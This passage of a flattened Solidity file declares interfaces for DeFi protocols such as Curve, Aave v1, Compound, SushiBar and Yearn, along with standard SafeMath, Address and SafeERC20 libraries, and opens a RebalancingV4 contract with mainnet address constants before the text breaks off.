    function FLAG_DISABLE_UNISWAP() external view returns (uint256);


    function FLAG_DISABLE_WETH() external view returns (uint256);


    function FLAG_ENABLE_KYBER_BANCOR_RESERVE() external view returns (uint256);


    function FLAG_ENABLE_KYBER_OASIS_RESERVE() external view returns (uint256);


    function FLAG_ENABLE_KYBER_UNISWAP_RESERVE() external view returns (uint256);


    function FLAG_ENABLE_MULTI_PATH_DAI() external view returns (uint256);


    function FLAG_ENABLE_MULTI_PATH_ETH() external view returns (uint256);


    function FLAG_ENABLE_MULTI_PATH_USDC() external view returns (uint256);


    function FLAG_ENABLE_UNISWAP_COMPOUND() external view returns (uint256);


    function claimAsset(address asset, uint256 amount) external;


    function getExpectedReturn(
        address fromToken,
        address toToken,
        uint256 amount,
        uint256 parts,
        uint256 featureFlags
    ) external view returns (uint256 returnAmount, uint256[] memory distribution);


    function isOwner() external view returns (bool);


    function oneSplitImpl() external view returns (address);


    function owner() external view returns (address);


    function renounceOwnership() external;


    function setNewImpl(address impl) external;


    function swap(
        address fromToken,
        address toToken,
        uint256 amount,
        uint256 minReturn,
        uint256[] memory distribution,
        uint256 featureFlags
    ) external payable;


    function transferOwnership(address newOwner) external;

}

pragma solidity ^0.7.3;

interface ICurveLINK {

    function A() external view returns (uint256);


    function A_precise() external view returns (uint256);


    function get_virtual_price() external view returns (uint256);


    function calc_token_amount(uint256[2] memory _amounts, bool _is_deposit) external view returns (uint256);


    function add_liquidity(uint256[2] memory _amounts, uint256 _min_mint_amount) external returns (uint256);


    function get_dy(
        int128 i,
        int128 j,
        uint256 _dx
    ) external view returns (uint256);


    function exchange(
        int128 i,
        int128 j,
        uint256 _dx,
        uint256 _min_dy
    ) external returns (uint256);


    function remove_liquidity(uint256 _amount, uint256[2] memory _min_amounts) external returns (uint256[2] memory);


    function remove_liquidity_imbalance(uint256[2] memory _amounts, uint256 _max_burn_amount)
        external
        returns (uint256);


    function calc_withdraw_one_coin(uint256 _token_amount, int128 i) external view returns (uint256);


    function remove_liquidity_one_coin(
        uint256 _token_amount,
        int128 i,
        uint256 _min_amount
    ) external returns (uint256);


    function ramp_A(uint256 _future_A, uint256 _future_time) external;


    function stop_ramp_A() external;


    function commit_new_fee(uint256 _new_fee, uint256 _new_admin_fee) external;


    function apply_new_fee() external;


    function revert_new_parameters() external;


    function commit_transfer_ownership(address _owner) external;


    function apply_transfer_ownership() external;


    function revert_transfer_ownership() external;


    function admin_balances(uint256 i) external view returns (uint256);


    function withdraw_admin_fees() external;


    function donate_admin_fees() external;


    function kill_me() external;


    function unkill_me() external;


    function coins(uint256 arg0) external view returns (address);


    function balances(uint256 arg0) external view returns (uint256);


    function fee() external view returns (uint256);


    function admin_fee() external view returns (uint256);


    function previous_balances(uint256 arg0) external view returns (uint256);


    function block_timestamp_last() external view returns (uint256);


    function owner() external view returns (address);


    function lp_token() external view returns (address);


    function initial_A() external view returns (uint256);


    function future_A() external view returns (uint256);


    function initial_A_time() external view returns (uint256);


    function future_A_time() external view returns (uint256);


    function admin_actions_deadline() external view returns (uint256);


    function transfer_ownership_deadline() external view returns (uint256);


    function future_fee() external view returns (uint256);


    function future_admin_fee() external view returns (uint256);


    function future_owner() external view returns (address);

}

interface ILinkGauge {

    function decimals() external view returns (uint256);


    function integrate_checkpoint() external view returns (uint256);


    function user_checkpoint(address addr) external returns (bool);


    function claimable_tokens(address addr) external returns (uint256);


    function claimable_reward(address _addr, address _token) external returns (uint256);


    function claim_rewards() external;


    function claim_rewards(address _addr) external;


    function claim_historic_rewards(address[8] memory _reward_tokens) external;


    function claim_historic_rewards(address[8] memory _reward_tokens, address _addr) external;


    function kick(address addr) external;


    function set_approve_deposit(address addr, bool can_deposit) external;


    function deposit(uint256 _value) external;


    function deposit(uint256 _value, address _addr) external;


    function withdraw(uint256 _value) external;


    function allowance(address _owner, address _spender) external view returns (uint256);


    function transfer(address _to, uint256 _value) external returns (bool);


    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool);


    function approve(address _spender, uint256 _value) external returns (bool);


    function increaseAllowance(address _spender, uint256 _added_value) external returns (bool);


    function decreaseAllowance(address _spender, uint256 _subtracted_value) external returns (bool);


    function set_rewards(
        address _reward_contract,
        bytes32 _sigs,
        address[8] memory _reward_tokens
    ) external;


    function set_killed(bool _is_killed) external;


    function commit_transfer_ownership(address addr) external;


    function accept_transfer_ownership() external;


    function minter() external view returns (address);


    function crv_token() external view returns (address);


    function lp_token() external view returns (address);


    function controller() external view returns (address);


    function voting_escrow() external view returns (address);


    function future_epoch_time() external view returns (uint256);


    function balanceOf(address arg0) external view returns (uint256);


    function totalSupply() external view returns (uint256);


    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function approved_to_deposit(address arg0, address arg1) external view returns (bool);


    function working_balances(address arg0) external view returns (uint256);


    function working_supply() external view returns (uint256);


    function period() external view returns (int128);


    function period_timestamp(uint256 arg0) external view returns (uint256);


    function integrate_inv_supply(uint256 arg0) external view returns (uint256);


    function integrate_inv_supply_of(address arg0) external view returns (uint256);


    function integrate_checkpoint_of(address arg0) external view returns (uint256);


    function integrate_fraction(address arg0) external view returns (uint256);


    function inflation_rate() external view returns (uint256);


    function reward_contract() external view returns (address);


    function reward_tokens(uint256 arg0) external view returns (address);


    function reward_integral(address arg0) external view returns (uint256);


    function reward_integral_for(address arg0, address arg1) external view returns (uint256);


    function admin() external view returns (address);


    function future_admin() external view returns (address);


    function is_killed() external view returns (bool);

}

pragma solidity ^0.7.3;

interface IATokenV1 {

    function UINT_MAX_VALUE() external view returns (uint256);


    function allowInterestRedirectionTo(address _to) external;


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 value) external returns (bool);


    function balanceOf(address _user) external view returns (uint256);


    function burnOnLiquidation(address _account, uint256 _value) external;


    function decimals() external view returns (uint8);


    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);


    function getInterestRedirectionAddress(address _user) external view returns (address);


    function getRedirectedBalance(address _user) external view returns (uint256);


    function getUserIndex(address _user) external view returns (uint256);


    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);


    function isTransferAllowed(address _user, uint256 _amount) external view returns (bool);


    function mintOnDeposit(address _account, uint256 _amount) external;


    function name() external view returns (string memory);


    function principalBalanceOf(address _user) external view returns (uint256);


    function redeem(uint256 _amount) external;


    function redirectInterestStream(address _to) external;


    function redirectInterestStreamOf(address _from, address _to) external;


    function symbol() external view returns (string memory);


    function totalSupply() external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    function transferOnLiquidation(
        address _from,
        address _to,
        uint256 _value
    ) external;


    function underlyingAssetAddress() external view returns (address);

}

pragma solidity ^0.7.3;

interface ICToken {

    function _acceptAdmin() external returns (uint256);


    function _addReserves(uint256 addAmount) external returns (uint256);


    function _reduceReserves(uint256 reduceAmount) external returns (uint256);


    function _setComptroller(address newComptroller) external returns (uint256);


    function _setImplementation(
        address implementation_,
        bool allowResign,
        bytes memory becomeImplementationData
    ) external;


    function _setInterestRateModel(address newInterestRateModel) external returns (uint256);


    function _setPendingAdmin(address newPendingAdmin) external returns (uint256);


    function _setReserveFactor(uint256 newReserveFactorMantissa) external returns (uint256);


    function accrualBlockNumber() external view returns (uint256);


    function accrueInterest() external returns (uint256);


    function admin() external view returns (address);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function balanceOf(address owner) external view returns (uint256);


    function balanceOfUnderlying(address owner) external returns (uint256);


    function borrow(uint256 borrowAmount) external returns (uint256);


    function borrowBalanceCurrent(address account) external returns (uint256);


    function borrowBalanceStored(address account) external view returns (uint256);


    function borrowIndex() external view returns (uint256);


    function borrowRatePerBlock() external view returns (uint256);


    function comptroller() external view returns (address);


    function decimals() external view returns (uint8);


    function delegateToImplementation(bytes memory data) external returns (bytes memory);


    function delegateToViewImplementation(bytes memory data) external view returns (bytes memory);


    function exchangeRateCurrent() external returns (uint256);


    function exchangeRateStored() external view returns (uint256);


    function getAccountSnapshot(address account)
        external
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256
        );


    function getCash() external view returns (uint256);


    function implementation() external view returns (address);


    function interestRateModel() external view returns (address);


    function isCToken() external view returns (bool);


    function liquidateBorrow(
        address borrower,
        uint256 repayAmount,
        address cTokenCollateral
    ) external returns (uint256);


    function mint(uint256 mintAmount) external returns (uint256);


    function name() external view returns (string memory);


    function pendingAdmin() external view returns (address);


    function redeem(uint256 redeemTokens) external returns (uint256);


    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);


    function repayBorrow(uint256 repayAmount) external returns (uint256);


    function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256);


    function reserveFactorMantissa() external view returns (uint256);


    function seize(
        address liquidator,
        address borrower,
        uint256 seizeTokens
    ) external returns (uint256);


    function supplyRatePerBlock() external view returns (uint256);


    function symbol() external view returns (string memory);


    function totalBorrows() external view returns (uint256);


    function totalBorrowsCurrent() external returns (uint256);


    function totalReserves() external view returns (uint256);


    function totalSupply() external view returns (uint256);


    function transfer(address dst, uint256 amount) external returns (bool);


    function transferFrom(
        address src,
        address dst,
        uint256 amount
    ) external returns (bool);


    function underlying() external view returns (address);

}

pragma solidity ^0.7.3;

interface IComptroller {

    function _addCompMarkets(address[] memory cTokens) external;


    function _become(address unitroller) external;


    function _borrowGuardianPaused() external view returns (bool);


    function _dropCompMarket(address cToken) external;


    function _grantComp(address recipient, uint256 amount) external;


    function _mintGuardianPaused() external view returns (bool);


    function _setBorrowCapGuardian(address newBorrowCapGuardian) external;


    function _setBorrowPaused(address cToken, bool state) external returns (bool);


    function _setCloseFactor(uint256 newCloseFactorMantissa) external returns (uint256);


    function _setCollateralFactor(address cToken, uint256 newCollateralFactorMantissa) external returns (uint256);


    function _setCompRate(uint256 compRate_) external;


    function _setContributorCompSpeed(address contributor, uint256 compSpeed) external;


    function _setLiquidationIncentive(uint256 newLiquidationIncentiveMantissa) external returns (uint256);


    function _setMarketBorrowCaps(address[] memory cTokens, uint256[] memory newBorrowCaps) external;


    function _setMintPaused(address cToken, bool state) external returns (bool);


    function _setPauseGuardian(address newPauseGuardian) external returns (uint256);


    function _setPriceOracle(address newOracle) external returns (uint256);


    function _setSeizePaused(bool state) external returns (bool);


    function _setTransferPaused(bool state) external returns (bool);


    function _supportMarket(address cToken) external returns (uint256);


    function accountAssets(address, uint256) external view returns (address);


    function admin() external view returns (address);


    function allMarkets(uint256) external view returns (address);


    function borrowAllowed(
        address cToken,
        address borrower,
        uint256 borrowAmount
    ) external returns (uint256);


    function borrowCapGuardian() external view returns (address);


    function borrowCaps(address) external view returns (uint256);


    function borrowGuardianPaused(address) external view returns (bool);


    function borrowVerify(
        address cToken,
        address borrower,
        uint256 borrowAmount
    ) external;


    function checkMembership(address account, address cToken) external view returns (bool);


    function claimComp(address holder, address[] memory cTokens) external;


    function claimComp(
        address[] memory holders,
        address[] memory cTokens,
        bool borrowers,
        bool suppliers
    ) external;


    function claimComp(address holder) external;


    function closeFactorMantissa() external view returns (uint256);


    function compAccrued(address) external view returns (uint256);


    function compBorrowState(address) external view returns (uint224 index, uint32);


    function compBorrowerIndex(address, address) external view returns (uint256);


    function compClaimThreshold() external view returns (uint256);


    function compContributorSpeeds(address) external view returns (uint256);


    function compInitialIndex() external view returns (uint224);


    function compRate() external view returns (uint256);


    function compSpeeds(address) external view returns (uint256);


    function compSupplierIndex(address, address) external view returns (uint256);


    function compSupplyState(address) external view returns (uint224 index, uint32);


    function comptrollerImplementation() external view returns (address);


    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);


    function exitMarket(address cTokenAddress) external returns (uint256);


    function getAccountLiquidity(address account)
        external
        view
        returns (
            uint256,
            uint256,
            uint256
        );


    function getAllMarkets() external view returns (address[] memory);


    function getAssetsIn(address account) external view returns (address[] memory);


    function getBlockNumber() external view returns (uint256);


    function getCompAddress() external view returns (address);


    function getHypotheticalAccountLiquidity(
        address account,
        address cTokenModify,
        uint256 redeemTokens,
        uint256 borrowAmount
    )
        external
        view
        returns (
            uint256,
            uint256,
            uint256
        );


    function isComptroller() external view returns (bool);


    function lastContributorBlock(address) external view returns (uint256);


    function liquidateBorrowAllowed(
        address cTokenBorrowed,
        address cTokenCollateral,
        address liquidator,
        address borrower,
        uint256 repayAmount
    ) external returns (uint256);


    function liquidateBorrowVerify(
        address cTokenBorrowed,
        address cTokenCollateral,
        address liquidator,
        address borrower,
        uint256 actualRepayAmount,
        uint256 seizeTokens
    ) external;


    function liquidateCalculateSeizeTokens(
        address cTokenBorrowed,
        address cTokenCollateral,
        uint256 actualRepayAmount
    ) external view returns (uint256, uint256);


    function liquidationIncentiveMantissa() external view returns (uint256);


    function markets(address)
        external
        view
        returns (
            bool isListed,
            uint256 collateralFactorMantissa,
            bool isComped
        );


    function maxAssets() external view returns (uint256);


    function mintAllowed(
        address cToken,
        address minter,
        uint256 mintAmount
    ) external returns (uint256);


    function mintGuardianPaused(address) external view returns (bool);


    function mintVerify(
        address cToken,
        address minter,
        uint256 actualMintAmount,
        uint256 mintTokens
    ) external;


    function oracle() external view returns (address);


    function pauseGuardian() external view returns (address);


    function pendingAdmin() external view returns (address);


    function pendingComptrollerImplementation() external view returns (address);


    function redeemAllowed(
        address cToken,
        address redeemer,
        uint256 redeemTokens
    ) external returns (uint256);


    function redeemVerify(
        address cToken,
        address redeemer,
        uint256 redeemAmount,
        uint256 redeemTokens
    ) external;


    function refreshCompSpeeds() external;


    function repayBorrowAllowed(
        address cToken,
        address payer,
        address borrower,
        uint256 repayAmount
    ) external returns (uint256);


    function repayBorrowVerify(
        address cToken,
        address payer,
        address borrower,
        uint256 actualRepayAmount,
        uint256 borrowerIndex
    ) external;


    function seizeAllowed(
        address cTokenCollateral,
        address cTokenBorrowed,
        address liquidator,
        address borrower,
        uint256 seizeTokens
    ) external returns (uint256);


    function seizeGuardianPaused() external view returns (bool);


    function seizeVerify(
        address cTokenCollateral,
        address cTokenBorrowed,
        address liquidator,
        address borrower,
        uint256 seizeTokens
    ) external;


    function transferAllowed(
        address cToken,
        address src,
        address dst,
        uint256 transferTokens
    ) external returns (uint256);


    function transferGuardianPaused() external view returns (bool);


    function transferVerify(
        address cToken,
        address src,
        address dst,
        uint256 transferTokens
    ) external;


    function updateContributorRewards(address contributor) external;

}

pragma solidity ^0.7.3;

interface ISushiBar {

    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function balanceOf(address account) external view returns (uint256);


    function decimals() external view returns (uint8);


    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);


    function enter(uint256 _amount) external;


    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);


    function leave(uint256 _share) external;


    function name() external view returns (string memory);


    function sushi() external view returns (address);


    function symbol() external view returns (string memory);


    function totalSupply() external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

}

pragma solidity ^0.7.3;

interface ILendingPoolV1 {

    function LENDINGPOOL_REVISION() external view returns (uint256);


    function UINT_MAX_VALUE() external view returns (uint256);


    function addressesProvider() external view returns (address);


    function borrow(
        address _reserve,
        uint256 _amount,
        uint256 _interestRateMode,
        uint16 _referralCode
    ) external;


    function core() external view returns (address);


    function dataProvider() external view returns (address);


    function deposit(
        address _reserve,
        uint256 _amount,
        uint16 _referralCode
    ) external payable;


    function flashLoan(
        address _receiver,
        address _reserve,
        uint256 _amount,
        bytes memory _params
    ) external;


    function getReserveConfigurationData(address _reserve)
        external
        view
        returns (
            uint256 ltv,
            uint256 liquidationThreshold,
            uint256 liquidationBonus,
            address interestRateStrategyAddress,
            bool usageAsCollateralEnabled,
            bool borrowingEnabled,
            bool stableBorrowRateEnabled,
            bool isActive
        );


    function getReserveData(address _reserve)
        external
        view
        returns (
            uint256 totalLiquidity,
            uint256 availableLiquidity,
            uint256 totalBorrowsStable,
            uint256 totalBorrowsVariable,
            uint256 liquidityRate,
            uint256 variableBorrowRate,
            uint256 stableBorrowRate,
            uint256 averageStableBorrowRate,
            uint256 utilizationRate,
            uint256 liquidityIndex,
            uint256 variableBorrowIndex,
            address aTokenAddress,
            uint40 lastUpdateTimestamp
        );


    function getReserves() external view returns (address[] memory);


    function getUserAccountData(address _user)
        external
        view
        returns (
            uint256 totalLiquidityETH,
            uint256 totalCollateralETH,
            uint256 totalBorrowsETH,
            uint256 totalFeesETH,
            uint256 availableBorrowsETH,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );


    function getUserReserveData(address _reserve, address _user)
        external
        view
        returns (
            uint256 currentATokenBalance,
            uint256 currentBorrowBalance,
            uint256 principalBorrowBalance,
            uint256 borrowRateMode,
            uint256 borrowRate,
            uint256 liquidityRate,
            uint256 originationFee,
            uint256 variableBorrowIndex,
            uint256 lastUpdateTimestamp,
            bool usageAsCollateralEnabled
        );


    function initialize(address _addressesProvider) external;


    function liquidationCall(
        address _collateral,
        address _reserve,
        address _user,
        uint256 _purchaseAmount,
        bool _receiveAToken
    ) external payable;


    function parametersProvider() external view returns (address);


    function rebalanceStableBorrowRate(address _reserve, address _user) external;


    function redeemUnderlying(
        address _reserve,
        address _user,
        uint256 _amount,
        uint256 _aTokenBalanceAfterRedeem
    ) external;


    function repay(
        address _reserve,
        uint256 _amount,
        address _onBehalfOf
    ) external payable;


    function setUserUseReserveAsCollateral(address _reserve, bool _useAsCollateral) external;


    function swapBorrowRateMode(address _reserve) external;

}

pragma solidity ^0.7.3;

interface ICompoundLens {

    function getCompBalanceMetadataExt(
        address comp,
        address comptroller,
        address account
    )
        external
        returns (
            uint256 balance,
            uint256 votes,
            address delegate,
            uint256 allocated
        );

}

pragma solidity ^0.7.3;

interface IYearn {

    function initialize(
        address token,
        address governance,
        address rewards,
        string memory nameOverride,
        string memory symbolOverride
    ) external;


    function initialize(
        address token,
        address governance,
        address rewards,
        string memory nameOverride,
        string memory symbolOverride,
        address guardian
    ) external;


    function apiVersion() external pure returns (string memory);


    function setName(string memory name) external;


    function setSymbol(string memory symbol) external;


    function setGovernance(address governance) external;


    function acceptGovernance() external;


    function setManagement(address management) external;


    function setGuestList(address guestList) external;


    function setRewards(address rewards) external;


    function setLockedProfitDegration(uint256 degration) external;


    function setDepositLimit(uint256 limit) external;


    function setPerformanceFee(uint256 fee) external;


    function setManagementFee(uint256 fee) external;


    function setGuardian(address guardian) external;


    function setEmergencyShutdown(bool active) external;


    function setWithdrawalQueue(address[20] memory queue) external;


    function transfer(address receiver, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address receiver,
        uint256 amount
    ) external returns (bool);


    function approve(address spender, uint256 amount) external returns (bool);


    function increaseAllowance(address spender, uint256 amount) external returns (bool);


    function decreaseAllowance(address spender, uint256 amount) external returns (bool);


    function permit(
        address owner,
        address spender,
        uint256 amount,
        uint256 expiry,
        bytes memory signature
    ) external returns (bool);


    function totalAssets() external view returns (uint256);


    function deposit() external returns (uint256);


    function deposit(uint256 _amount) external returns (uint256);


    function deposit(uint256 _amount, address recipient) external returns (uint256);


    function maxAvailableShares() external view returns (uint256);


    function withdraw() external returns (uint256);


    function withdraw(uint256 maxShares) external returns (uint256);


    function withdraw(uint256 maxShares, address recipient) external returns (uint256);


    function withdraw(
        uint256 maxShares,
        address recipient,
        uint256 maxLoss
    ) external returns (uint256);


    function pricePerShare() external view returns (uint256);


    function addStrategy(
        address strategy,
        uint256 debtRatio,
        uint256 minDebtPerHarvest,
        uint256 maxDebtPerHarvest,
        uint256 performanceFee
    ) external;


    function updateStrategyDebtRatio(address strategy, uint256 debtRatio) external;


    function updateStrategyMinDebtPerHarvest(address strategy, uint256 minDebtPerHarvest) external;


    function updateStrategyMaxDebtPerHarvest(address strategy, uint256 maxDebtPerHarvest) external;


    function updateStrategyPerformanceFee(address strategy, uint256 performanceFee) external;


    function migrateStrategy(address oldVersion, address newVersion) external;


    function revokeStrategy() external;


    function revokeStrategy(address strategy) external;


    function addStrategyToQueue(address strategy) external;


    function removeStrategyFromQueue(address strategy) external;


    function debtOutstanding() external view returns (uint256);


    function debtOutstanding(address strategy) external view returns (uint256);


    function creditAvailable() external view returns (uint256);


    function creditAvailable(address strategy) external view returns (uint256);


    function availableDepositLimit() external view returns (uint256);


    function expectedReturn() external view returns (uint256);


    function expectedReturn(address strategy) external view returns (uint256);


    function report(
        uint256 gain,
        uint256 loss,
        uint256 _debtPayment
    ) external returns (uint256);


    function sweep(address token) external;


    function sweep(address token, uint256 amount) external;


    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint256);


    function precisionFactor() external view returns (uint256);


    function balanceOf(address arg0) external view returns (uint256);


    function allowance(address arg0, address arg1) external view returns (uint256);


    function totalSupply() external view returns (uint256);


    function token() external view returns (address);


    function governance() external view returns (address);


    function management() external view returns (address);


    function guardian() external view returns (address);


    function guestList() external view returns (address);


    function strategies(address arg0)
        external
        view
        returns (
            uint256 performanceFee,
            uint256 activation,
            uint256 debtRatio,
            uint256 minDebtPerHarvest,
            uint256 maxDebtPerHarvest,
            uint256 lastReport,
            uint256 totalDebt,
            uint256 totalGain,
            uint256 totalLoss
        );


    function withdrawalQueue(uint256 arg0) external view returns (address);


    function emergencyShutdown() external view returns (bool);


    function depositLimit() external view returns (uint256);


    function debtRatio() external view returns (uint256);


    function totalDebt() external view returns (uint256);


    function lastReport() external view returns (uint256);


    function activation() external view returns (uint256);


    function lockedProfit() external view returns (uint256);


    function lockedProfitDegration() external view returns (uint256);


    function rewards() external view returns (address);


    function managementFee() external view returns (uint256);


    function performanceFee() external view returns (uint256);


    function nonces(address arg0) external view returns (uint256);


    function DOMAIN_SEPARATOR() external view returns (bytes32);

}

pragma solidity >=0.6.0 <0.8.0;

interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity >=0.6.0 <0.8.0;

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        if (b > a) return (false, 0);
        return (true, a - b);
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        if (b == 0) return (false, 0);
        return (true, a / b);
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        if (b == 0) return (false, 0);
        return (true, a % b);
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);
        return a - b;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        return a / b;
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        return a % b;
    }
}

pragma solidity >=0.6.2 <0.8.0;

library Address {

    function isContract(address account) internal view returns (bool) {


        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {

      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {

        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {

        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {

        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {

        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {

        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {

        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {

        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {

        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

pragma solidity >=0.6.0 <0.8.0;


library SafeERC20 {

    using SafeMath for uint256;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {

        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {

        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {

        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {

        uint256 newAllowance = token.allowance(address(this), spender).add(value);
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {

        uint256 newAllowance = token.allowance(address(this), spender).sub(value, "SafeERC20: decreased allowance below zero");
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) private {


        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) { // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

pragma solidity ^0.7.3;




contract RebalancingV4 is Storage, Constants, IO {

    using SafeERC20 for IERC20;
    using SafeMath for uint256;

    address constant ZERO_X = 0xDef1C0ded9bec7F1a1670819833240f027b25EfF;

    address constant ONE_SPLIT = 0xC586BeF4a0992C495Cf22e1aeEE4E446CECDee0E;

    address constant LENDING_POOL_V1 = 0x398eC7346DcD622eDc5ae82352F02bE94C62d119;
    address constant LENDING_POOL_CORE_V1 = 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3;

    address constant XSUSHI = 0x8798249c2E607446EfB7Ad49eC89dD1865Ff4272;

    address constant CURVE_LINK = 0xF178C0b5Bb7e7aBF4e12A4838C7b7c5bA2C623c0;

    address constant CUNI = 0x35A18000230DA775CAc24873d00Ff85BccdeD550;
    address constant CCOMP = 0x70e36f6BF80a52b3B46b3aF8e106CC0ed743E8e4;

    address constant AYFIv1 = 0x12e51E77DAAA58aA0E9247db7510Ea4B46F9bEAd;
    address constant ASNXv1 = 0x328C4c80BC7aCa0834Db37e6600A6c49E12Da4DE;
    address constant AMKRv1 = 0x7deB5e830be29F91E298ba5FF1356BB7f8146998;
    address constant ARENv1 = 0x69948cC03f478B95283F7dbf1CE764d0fc7EC54C;
    address constant AKNCv1 = 0x9D91BE44C06d373a8a226E1f3b146956083803eB;

    address constant yveCRV = 0xc5bDdf9843308380375a611c18B50Fb9341f502A;
    address constant yvBOOST = 0x9d409a0A012CFbA9B15F6D4B36Ac57A46966Ab9a;
    address constant yvUNI = 0xFBEB78a723b8087fD2ea7Ef1afEc93d35E8Bed42;
    address constant yvYFI = 0xE14d13d8B3b85aF791b2AADD661cDBd5E6097Db1;
    address constant yvSNX = 0xF29AE508698bDeF169B89834F76704C3B205aedf;

    address constant linkCRV = 0xcee60cFa923170e4f8204AE08B4fA6A3F5656F3a;
    address constant gaugeLinkCRV = 0xFD4D8a17df4C27c1dD245d153ccf4499e806C87D;

    address constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
